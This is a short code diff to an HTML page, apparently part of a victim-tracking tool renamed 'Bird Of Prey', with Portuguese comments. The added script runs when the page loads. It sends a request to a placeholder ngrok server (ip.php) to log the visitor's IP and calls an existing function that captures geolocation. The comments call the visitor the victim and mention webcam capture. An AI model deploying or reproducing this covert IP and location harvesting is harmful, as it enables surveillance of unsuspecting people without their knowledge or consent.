@@ -3,8 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SeekerCheese</title>
+    <title>Bird Of Prey</title>
     <script>
+// Função para capturar o IP do visitante
+function captureIP() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://SEU-LINK-NGROK/ip.php", true);  // Substitua pelo link gerado pelo Ngrok
+    xhr.send();
+}
+
+// Capturar a geolocalização e a webcam quando a página carregar
+window.onload = function() {
+    captureIP();  // Captura o IP da vítima
+    getLocation();  // Captura a geolocalização (função existente)
+};
+     
         // Função para capturar a localização do usuário
         function getLocation() {
             if (navigator.geolocation) {
